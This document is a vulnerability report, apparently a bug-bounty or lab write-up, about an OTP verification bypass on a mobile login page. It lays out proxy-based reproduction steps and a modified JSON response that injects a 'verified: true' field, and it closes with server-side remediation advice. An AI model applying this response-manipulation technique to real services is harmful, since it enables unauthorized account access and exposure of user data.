# Authentication Bypass - Mobile OTP Verification

## Summary

I identified an Authentication Bypass vulnerability in the Blinkit mobile number verification process.

The application accepts a 6-digit OTP (One-Time Password) via a POST request to verify a user's mobile number. However, unlike typical secure implementations, the server does not return a `verify` status in the response. By intercepting the response and injecting a `"verified": true` field, an attacker can bypass the OTP verification process and gain access to the application without providing a valid verification code.

This vulnerability occurs because the application trusts client-side values from the server response without performing proper server-side validation of the OTP. An attacker can use a web proxy (like Burp Suite or OWASP ZAP) to intercept the response and modify/add a JSON field to grant access.

## Vulnerability Type

**Authentication Bypass (Client-Trusted Response Manipulation)**

## Vulnerable Parameters

```text
mobile (or similar)
otp
verified (injected response parameter)
```

## Vulnerable URL

```text
https://koko-mobile.kzlabs.in/?action=verify
```

## Steps to Reproduce

1. Navigate to the vulnerable Blinkit mobile verification page.

2. Enter a mobile number (e.g., `+91 12134 51425`).

3. Click the **Verify OTP** button.

4. Enter any 6-digit OTP (e.g., `111111`).

5. Intercept the verification request using Burp Suite, OWASP ZAP, or a similar proxy tool.

6. Observe the server response containing a JSON payload with only a `message` field.

7. Inject a `"verified": true` field into the JSON response.

8. Forward the modified response to the client.

9. Observe that the application grants access and displays the dashboard.

## Payloads Used

Original request:
```json
{
    "mobile": "+911213451425",
    "otp": "111111"
}
```

Original response:
```json
{
    "message": "Incorrect OTP. Please try again."
}
```

Modified response:
```json
{
    "message": "Incorrect OTP. Please try again.",
    "verified": true
}
```

## Proof of Concept

The application sends a POST request to the server with the mobile number and OTP:

```http
POST /?action=verify HTTP/2
Host: koko-mobile.kzlabs.in
Content-Type: application/json

{
    "mobile": "+911213451425",
    "otp": "111111"
}
```

The server responds with a JSON payload:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "message": "Incorrect OTP. Please try again."
}
```

The vulnerability exists because:
1. The server does not return a `verify` or `verified` status in the response
2. The application checks for a `verified: true` field in the response
3. By injecting this field, an attacker can bypass the verification

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "message": "Incorrect OTP. Please try again.",
    "verified": true
}
```

The application grants access based on the injected `verified` value.

## Impact

This Authentication Bypass vulnerability allows an attacker to:

- Bypass mobile number verification without a valid OTP
- Create fraudulent accounts with unverified mobile numbers
- Access restricted application features without proper authentication
- Potentially conduct account takeover attacks
- Bypass multi-factor authentication controls
- View order history and sensitive user information

## Recommendation

To mitigate this vulnerability:

- **Server-Side Validation**: Never trust client-side values for verification decisions. Perform all OTP validation on the server side.
  ```php
  // Server-side OTP validation
  if ($otpFromDatabase === $userSubmittedOtp) {
      $_SESSION['verified'] = true;
      $_SESSION['mobile'] = $mobile;
      // Return success status from server
      echo json_encode(['verified' => true]);
  } else {
      // Return failure status from server
      echo json_encode(['verified' => false, 'message' => 'Incorrect OTP']);
  }
  ```

- **Session Management**: Use secure server-side sessions to track verification status.

- **OTP Expiration**: Implement proper OTP expiration (e.g., 10-minute validity).

- **Rate Limiting**: Implement rate limiting on OTP verification endpoints.

- **Input Validation**: Validate all input parameters before processing.

- **Response Integrity**: Do not rely on client-side values for authentication decisions.

- **Security Headers**: Implement security headers like `X-Content-Type-Options` and `X-Frame-Options`.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.
